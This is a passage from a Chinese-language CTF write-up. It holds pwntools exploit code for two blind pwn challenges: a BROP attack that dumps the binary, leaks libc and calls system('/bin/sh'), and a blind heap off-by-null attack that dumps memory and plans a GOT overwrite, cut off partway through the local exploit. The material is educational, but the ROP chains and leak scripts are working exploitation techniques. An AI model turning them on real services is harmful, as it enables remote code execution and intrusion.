                sh.close()
    def Dump_file(func_plt,padding_length,stop_gadget,brop_gadget):
        process_old_had_received_length=0
        process_now_had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                while True:
                    sh.recvuntil("Please tell me:")
                    payload  = 'A' * (padding_length - len('Begin_leak----->'))
                    payload += 'Begin_leak----->'
                    payload += p64(brop_gadget+9) # pop rdi;ret;
                    payload += p64(0x400000+process_now_had_received_length)
                    payload += p64(func_plt)
                    payload += p64(stop_gadget)
                    sh.send(payload)
                    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
                    received_data = sh.recvuntil('x0AHello')[:-6]
                    if len(received_data) == 0 :
                        file_content += 'x00'
                        process_now_had_received_length += 1
                    else :
                        file_content += received_data
                        process_now_had_received_length += len(received_data)
            except:
                if process_now_had_received_length == process_old_had_received_length :
                    log.info('We get ' + str(process_old_had_received_length) +' byte file!')
                    with open('axb_2019_brop64_dump','wb') as fout:
                        fout.write(file_content)
                    return
                process_old_had_received_length = process_now_had_received_length
                sh.close()
                pass
    padding_length=216
    if padding_length is null:
        padding_length=Force_find_padding()
    old_return_addr=0x400834
    if old_return_addr is null:
        sh.recvuntil("Please tell me:")
        sh.send('A' * padding_length)
        sh.recvuntil('A' * padding_length)
        old_return_addr=u64(sh.recvuntil('Goodbye!').strip('Goodbye!').ljust(8,'x00'))
        log.info('The old return address is '+ hex(old_return_addr))
    stop_gadget=0x4007D6
    if stop_gadget is null:
        stop_gadget=Find_stop_gadget(old_return_addr & 0xFFF000,padding_length)
    brop_gadget=0x40095A
    if brop_gadget is null:
        brop_gadget=Find_brop_gadget(old_return_addr & 0xFFF000,padding_length,stop_gadget)
    func_plt=0x400635
    if func_plt is null:
        func_plt=Find_func_plt(old_return_addr & 0xFFF000,padding_length,stop_gadget,brop_gadget)
    is_dumped=True
    if is_dumped is not True:
        Dump_file(func_plt,padding_length,stop_gadget,brop_gadget)
        is_dumped=True
    sh = get_sh()
    puts_got_addr=0x601018
    puts_plt_addr=0x400640
    payload  = 'A' * (padding_length - len('Begin_leak----->'))
    payload += 'Begin_leak----->'
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(puts_got_addr)
    payload += p64(puts_plt_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recvuntil('Begin_leak----->' + p64(brop_gadget+9).strip('x00'))
    puts_addr = u64(sh.recvuntil('x0AHello')[:-6].ljust(8,'x00'))
    libc_base = puts_addr - libc.symbols['puts']
    system_addr = libc_base + libc.symbols['system']
    bin_sh_addr = libc_base + libc.search('/bin/sh').next()
    payload  = 'A' * padding_length
    payload += p64(brop_gadget+9) # pop rdi;ret;
    payload += p64(bin_sh_addr)
    payload += p64(system_addr)
    payload += p64(stop_gadget)
    sh.recvuntil("Please tell me:")
    sh.send(payload)
    sh.recv()
    sh.interactive()
    sh.close()
## 0x05 Blind_Heap
###  以axb_2019_final_blindHeap为例
**漏洞探测**
首先，我们通过输入`a b`，通过程序的回显，我们可以看出， **程序的读入被空格截断了**
，根据这个特征，我们可以推测出，程序使用了`scanf()`作为输入函数。
我们判断出程序使用`scanf()`作为输入函数后，
**因为`scanf()`总会在我们输入的字符串的最后加`x00`**，我们便可以推测程序中是否存在`Off-by-one`漏洞存在。
**泄露堆地址——第一个Chunk的地址**
根据一般的堆题目的规律，程序的内存布局可能形如：
     : 0000000000000000 0000000000000000
     : 0000000000000000 0000000000000000
     : 0000000000000000 0000000000000000
那么当我们填满name区域后，申请一个Chunk，我们就可以泄露其地址。
    sh=get_sh()
    sh.recvuntil('Enter your name(1~32):')
    sh.send('A' * 24 + 'Leak--->')
    Add_shopping_cart(sh,0x40,'Chunk_0',0x40,'Chunk_0')
    sh.recvuntil('Your choice:')
    sh.sendline('3')
    sh.recvuntil('Your choice:')
    sh.sendline('1')
    sh.recvuntil('Leak--->')
    first_chunk_addr=u64(sh.recvuntil('U's').strip('U's').ljust(8,'x00'))
    log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
    #[+] We leak the first chunk address is 0x5626f3eeb0b0
**Dump内存（任意地址读）**
那么我们可以利用这个`off-by-null`构造一个任意地址读。
此处根据我们的输入我们事实上可以推测程序内的数据结构，结构应该如下：
    struct Cart{
        int name_size;
        char*    name;
        int desc_size;
        char*    desc;
    } cart;
那么程序中必然有：
  1. cart_list存放着若干个cart结构的地址。
  2. 每个cart结构均由malloc(0x20)产生。
  3. 每个name均由malloc(name_size)产生。
  4. 每个description均由malloc(desc_size)产生。
那么当我们的desc_size大于0x100字节就能保证name和cart结构一定位于0x100个字节以外，这样当cart结构的最低byte被置0时，一定位于description的可控区域。
例，description的起始地址是`0x6004????`，那么，description的可控区域就是`0x6004(?+1)???`，并且cart结构一定位于`0x6004?(?+1)(??+0x20)`，当最低byte被置0时，伪cart结构一定位于`0x6004?(?+1)00`，一定在可控区域，但是我们需要至少可控0x10字节才能控制cart结构中的name结构，那么也就要求我们的description的起始地址的最低byte一定需要大于0x10。因此泄露可能失败，失败率1/16。
我们写出泄露脚本：
    def Dump_file():
        had_received_length=0
        file_content=""
        while True:
            try:
                sh = get_sh()
                sh.recvuntil('Enter your name(1~32):')
                sh.send('A' * 0x18 + 'Leak--->')
                Add_shopping_cart(sh,0x150,'Chunk_0',0x8,'Chunk_0')
                sh.recvuntil('Your choice:')
                sh.sendline('3')
                sh.recvuntil('Your choice:')
                sh.sendline('1')
                sh.recvuntil('Leak--->')
                first_chunk_addr=u64(sh.recvuntil(''s').strip(''s').ljust(8,'x00')) - 0x150 - 0x10 - 0x10 - 0x10
                log.success('We leak the first chunk address is '+str(hex(first_chunk_addr)))
                padding = ( 0x100 - (first_chunk_addr & 0xFF) ) - 0x10
                payload = 'A' * padding + p64(0) + p64(0x30) 
                payload += p64(0xC) + p64(0x400000+had_received_length) 
                payload += p64(0xC) + p64(0x400000+had_received_length)
                Display_product(sh,1)
                Modify_product(sh,0,'Chunk_0',payload)
                Change_name(sh,'A' * 0x18 + 'Leak--->')
                Display_product(sh,1)
                sh.recvuntil('commodity's name is ')
                received_data = sh.recvuntil('x0Acommo',timeout=1)[:-6]
                if len(received_data) == 0 :
                    file_content += 'x00'
                    had_received_length += 1
                else :
                    file_content += received_data
                    had_received_length += len(received_data)
                log.info('We have get ' + str(had_received_length) +'byte file!')
                sh.close()
            except:
                log.info('We get ' + str(had_received_length) +' byte file!')
                with open('axb_2019_final_blindHeap_dump','wb') as fout:
                    fout.write(file_content)
                break
                sh.close()
                pass
    Dump_file()
**IDA文件修复 &分析**
虽然仍然有大量的函数分析不出来，甚至我们连main函数的位置都是未知的，但是，我们可以根据函数的固定`opcode`找到一个可分析的函数。
此时我们愿意相信远端没有开启RELRO保护，如果确实如此，我们只需要篡改got表地址即可，那么我们可以很容易分析出`sub_4007C0`疑似`puts`函数，那么我们先假设它为puts函数，然后泄露它的`.got`表地址。
我们还可以很容易的分析出，`sub_4007A0`应为free的got表地址。
那么我们接下来将free的got表地址篡改为system，调用即可。
**Local EXP（本地成功）**
    from pwn import *
    all_commodity=1
    just_one=2
    context.log_level='debug'
    context.arch='amd64'
    # file_name=ELF("./")
    libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
    def Add_shopping_cart(sh,product_descript_size,product_descript,product_name_size,product_name):
        sh.recvuntil('Your choice:')
        sh.sendline('1')
        sh.recvuntil('please tell me the desrcription's size.n')
        sh.sendline(str(product_descript_size))
        sh.recvuntil('please tell me the desrcript of commodity.n')
        sh.sendline(product_descript)
        sh.recvuntil('please tell me the commodity-name's size.n')
        sh.sendline(str(product_name_size))
        sh.recvuntil('please tell me the commodity-name.n')
        sh.sendline(product_name)
    def Modify_product(sh,index,product_name,product_descript):
        sh.recvuntil('Your choice:')
        sh.sendline('2')
        sh.recvuntil('The index is ')
        sh.sendline(str(index))
        sh.recvuntil('please tell me the new commodity's name.n')
        sh.sendline(product_name)
        sh.recvuntil('please tell me the new commodity's desrcription.n')
        sh.sendline(product_descript)
    def Display_product(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('3')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    def Buy_shopping_cart(sh):
        sh.recvuntil('Your choice:')
        sh.sendline('4')
    def Delete_shopping_cart(sh,mode,index=null):
        sh.recvuntil('Your choice:')
        sh.sendline('5')
        sh.recvuntil('Your choice:')
        sh.sendline(str(mode))
        if mode is just_one:
            sh.recvuntil('The index is ')
            sh.sendline(str(index))
    def Change_name(sh,new_name):